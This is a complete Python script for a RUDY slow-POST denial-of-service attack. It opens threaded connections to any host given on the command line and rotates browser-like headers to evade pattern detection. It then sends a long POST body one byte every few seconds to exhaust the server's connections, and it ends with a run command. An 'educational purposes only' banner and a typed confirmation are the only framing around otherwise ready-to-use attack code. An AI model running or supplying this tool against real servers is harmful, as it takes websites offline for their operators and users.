import socket
import random
import time
import argparse
import sys
from concurrent.futures import ThreadPoolExecutor

def generate_random_headers():
    """Generate random HTTP headers to avoid pattern detection"""
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0"
    ]
    
    return {
        "User-Agent": random.choice(user_agents),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/x-www-form-urlencoded",
        "Connection": "keep-alive",
        "Referer": "https://www.google.com/"
    }

def rudy_attack(target_host, target_port, target_path, connection_id):
    """Perform a single Rudy attack connection"""
    try:
        # Create socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        
        # Connect to target
        s.connect((target_host, target_port))
        
        # Prepare POST data (we'll send this very slowly)
        post_data = "data=" + "A" * 10000
        
        # Prepare headers
        headers = generate_random_headers()
        
        # Construct HTTP POST request headers
        http_request = f"POST {target_path} HTTP/1.1\r\n"
        http_request += f"Host: {target_host}\r\n"
        
        for header, value in headers.items():
            http_request += f"{header}: {value}\r\n"
        
        # Set Content-Length to the actual length of our post data
        http_request += f"Content-Length: {len(post_data)}\r\n\r\n"
        
        # Send the headers
        s.send(http_request.encode())
        
        print(f"[+] Connection {connection_id}: Headers sent, starting slow POST body")
        
        # Send the POST body extremely slowly, byte by byte
        for i in range(len(post_data)):
            # Send a single byte
            s.send(post_data[i].encode())
            
            # Sleep between sending bytes to keep the connection alive but slow
            time.sleep(random.uniform(5, 15))
            
            # Periodically report progress
            if i % 100 == 0:
                print(f"[+] Connection {connection_id}: Sent {i} of {len(post_data)} bytes")
        
        # Close the socket
        s.close()
        print(f"[+] Connection {connection_id}: Attack completed")
        
    except Exception as e:
        print(f"[-] Connection {connection_id}: Error - {str(e)}")
        try:
            s.close()
        except:
            pass

def main():
    parser = argparse.ArgumentParser(description="Rudy DDoS Attack Simulation - FOR EDUCATIONAL PURPOSES ONLY")
    parser.add_argument("host", help="Target host")
    parser.add_argument("--port", type=int, default=80, help="Target port (default: 80)")
    parser.add_argument("--path", default="/", help="Target path (default: /)")
    parser.add_argument("--connections", type=int, default=10, help="Number of connections (default: 10)")
    parser.add_argument("--threads", type=int, default=5, help="Number of threads (default: 5)")
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("RUDY ATTACK SIMULATION - EDUCATIONAL PURPOSES ONLY")
    print("=" * 60)
    print(f"Target: {args.host}:{args.port}{args.path}")
    print(f"Connections: {args.connections}")
    print(f"Threads: {args.threads}")
    print("=" * 60)
    print("Press Ctrl+C to stop the attack")
    print("=" * 60)
    
    # Confirm this is for educational purposes
    confirmation = input("This tool is for EDUCATIONAL PURPOSES ONLY. Type 'I UNDERSTAND' to continue: ")
    if confirmation.strip().upper() != "I UNDERSTAND":
        print("Confirmation failed. Exiting.")
        sys.exit(1)
    
    # Use ThreadPoolExecutor to manage connections
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        for i in range(args.connections):
            executor.submit(rudy_attack, args.host, args.port, args.path, i)
            # Small delay between starting connections
            time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
        print("[!] Shutting down...")
        sys.exit(0)
        
# How to run this script:
# python3 rudy.py example.com --port 80 --path / --connections 5 --threads 3

